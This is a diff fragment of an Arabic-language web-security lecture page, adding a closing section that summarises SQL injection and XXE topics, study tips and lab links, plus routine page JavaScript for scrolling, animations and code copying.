+            </div>
+        </div>
+
+        <!-- Conclusion Section -->
+        <div class="content-section" id="conclusion">
+            <h2 class="section-title">
+                <i class="fas fa-graduation-cap"></i>
+                خاتمة المحاضرة
             </h2>
 
             <div class="highlight-box">
-                <h3>مختبرات PortSwigger:</h3>
-                <ul style="margin-top: 15px; padding-right: 20px;">
-                    <li><a href="https://portswigger.net/web-security/sql-injection" style="color: #64b5f6;">SQL Injection Labs</a></li>
-                    <li><a href="https://portswigger.net/web-security/xxe" style="color: #64b5f6;">XXE Labs</a></li>
+                <h3><i class="fas fa-lightbulb"></i> ملخص ما تعلمناه</h3>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+                    <div>
+                        <h4 style="color: #64b5f6; margin-bottom: 10px;">SQL Injection</h4>
+                        <ul>
+                            <li>أساسيات SQL Injection وآليات العمل</li>
+                            <li>أنواع الهجمات (Error-based, Union-based, Blind)</li>
+                            <li>تقنيات الاستغلال المتقدمة</li>
+                            <li>3 مختبرات عملية من PortSwigger</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h4 style="color: #64b5f6; margin-bottom: 10px;">XXE Injection</h4>
+                        <ul>
+                            <li>أساسيات XXE ومعالجة XML</li>
+                            <li>أنواع الهجمات (File Disclosure, SSRF, XML Bomb)</li>
+                            <li>تقنيات Out-of-band</li>
+                            <li>3 مختبرات عملية شاملة</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="highlight-box warning">
+                <h4><i class="fas fa-exclamation-triangle"></i> نصائح مهمة للمتقدمين</h4>
+                <ul style="margin-top: 15px;">
+                    <li><strong>ابدأ بالأساسيات:</strong> أتقن Error-based قبل الانتقال لـ Blind techniques</li>
+                    <li><strong>استخدم أدوات متنوعة:</strong> sqlmap, Burp Suite, وأدوات مخصصة</li>
+                    <li><strong>تدرب على سيناريوهات مختلفة:</strong> كل قاعدة بيانات لها خصائصها</li>
+                    <li><strong>اقرأ Source Code:</strong> فهم الكود يساعد في إيجاد ثغرات أعمق</li>
                 </ul>
             </div>
-        </div>
 
-        <div style="text-align: center;">
-            <a href="../index.html" class="back-link">
-                <i class="fas fa-arrow-right"></i>
-                العودة للصفحة الرئيسية
-            </a>
+            <div class="attack-flow" style="margin: 30px 0;">
+                <div class="flow-step">الممارسة المستمرة</div>
+                <div class="flow-arrow"><i class="fas fa-arrow-left"></i></div>
+                <div class="flow-step">تطوير المهارات</div>
+                <div class="flow-arrow"><i class="fas fa-arrow-left"></i></div>
+                <div class="flow-step">الاحتراف</div>
+            </div>
+
+            <div style="text-align: center; margin-top: 40px; padding: 30px; background: rgba(100, 181, 246, 0.1); border-radius: 15px;">
+                <h3 style="color: #64b5f6; margin-bottom: 15px;">
+                    <i class="fas fa-heart"></i>
+                    شكراً لمتابعتكم
+                </h3>
+                <p style="font-size: 1.1em; margin-bottom: 20px;">
+                    أتمنى أن تكون هذه المحاضرة مفيدة في رحلتكم لتعلم أمان تطبيقات الويب
+                </p>
+                <div style="display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;">
+                    <a href="../index.html" style="color: #64b5f6; text-decoration: none; padding: 10px 20px; border: 1px solid #64b5f6; border-radius: 25px; transition: all 0.3s ease;">
+                        <i class="fas fa-home"></i> العودة للصفحة الرئيسية
+                    </a>
+                    <a href="https://github.com/abode1234/lecture-server-side-attack" target="_blank" style="color: #81c784; text-decoration: none; padding: 10px 20px; border: 1px solid #81c784; border-radius: 25px; transition: all 0.3s ease;">
+                        <i class="fab fa-github"></i> المصدر على GitHub
+                    </a>
+                </div>
+            </div>
         </div>
     </div>
+
+    <!-- Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+    
+    <script>
+        // Progress bar functionality
+        window.addEventListener('scroll', () => {
+            const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
+            const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+            const scrolled = (winScroll / height) * 100;
+            document.getElementById('progressBar').style.width = scrolled + '%';
+        });
+
+        // Smooth scrolling for navigation links
+        document.querySelectorAll('.nav-menu a').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+
+        // Add animation to lab cards
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = '1';
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, observerOptions);
+
+        // Observe all lab cards and content sections
+        document.querySelectorAll('.lab-card, .content-section').forEach(el => {
+            el.style.opacity = '0';
+            el.style.transform = 'translateY(30px)';
+            el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+            observer.observe(el);
+        });
+
+        // Copy code functionality
+        document.querySelectorAll('.code-block pre').forEach(pre => {
+            pre.addEventListener('click', () => {
+                const text = pre.textContent;
+                navigator.clipboard.writeText(text).then(() => {
+                    // Visual feedback
+                    const original = pre.style.background;
+                    pre.style.background = 'rgba(129, 199, 132, 0.2)';
+                    setTimeout(() => {
+                        pre.style.background = original;
+                    }, 500);
+                });
+            });
+            
+            // Add click hint
+            pre.style.cursor = 'pointer';
+            pre.title = 'اضغط لنسخ الكود';
+        });
+    </script>
 </body>
 </html> 
